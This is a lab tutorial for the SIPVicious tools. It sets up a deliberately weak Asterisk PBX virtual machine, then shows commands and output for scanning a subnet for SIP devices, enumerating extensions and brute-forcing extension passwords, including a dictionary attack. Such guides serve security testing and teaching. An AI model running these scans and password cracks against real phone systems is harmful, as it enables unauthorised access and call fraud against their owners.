# Introduction #

This guide assumes that you're running either a Linux or a Windows box. It also assumes that you're sufficiently comfortable with the command line. We will get a virtual machine running Asterisk PBX as a target and launch SIPVicious tools against it.

For an animated version of this check out:

[SIPVicious 0.2 introduction](http://sipvicious.org/webcasts/sipvicious-0.2-intro/web.html)


# Preparation #

  1. Get the latest VMWare Player from [here](http://www.vmware.com/download/player/)
  1. Get the latest Trixbox vmware image from [here](http://www.trixbox.org/downloads)

# Setting up the Victim box #

Once you have Trixbox up make sure to create a few extensions. In our lab we have extensions 100, 101 and 123. Choose a numeric password for extension "100", no password for "101" and an alphabetic password like "secret".

# Making use of SIPVicious tools #

I'll assume that your network is on the 192.168.1 subnet from now on. Replace that with your own subnet.

First run svmap.py against your subnet to find your Asterisk box:
```
[you@box sipvicious]$ ./svmap 192.168.1.1/24
| SIP Device         | User Agent   |
-------------------------------------
| 192.168.1.103:5060 | Asterisk PBX |
[you@box sipvicious]$
```

You should get results similar to the above. If not, make sure that you're scanning the right network.

To identify the extensions that you created previously:
```
[you@box sipvicious]$ ./svwar.py 192.168.1.103 
| Extension | Authentication |
------------------------------
| 123       | reqauth        |
| 100       | reqauth        |
| 101       | noauth         |
[you@box sipvicious]$
```

As you can see, extension 101 does not require authentication.
Finally to crack the password for 100, we just run the following command:
```
[you@box sipvicious]$ ./svcrack.py 192.168.1.103 -u 100
| Extension | Password |
------------------------
| 100       | 100      |
[you@box sipvicious]$
```

To crack an alphanumeric password we need to make use of a dictionary file. Create a text file called "dictionary.txt" containing your password.
```
[you@box sipvicious]$ ./svcrack.py 192.168.1.103 -u 123 -d dictionary.txt
| Extension | Password |
------------------------
| 123       | secret   |
[you@box sipvicious]$
```

Following that, you can make use of the credentials by making use of a SIP softphone such as [X-lite](http://www.counterpath.com/).

Hope that makes you happy.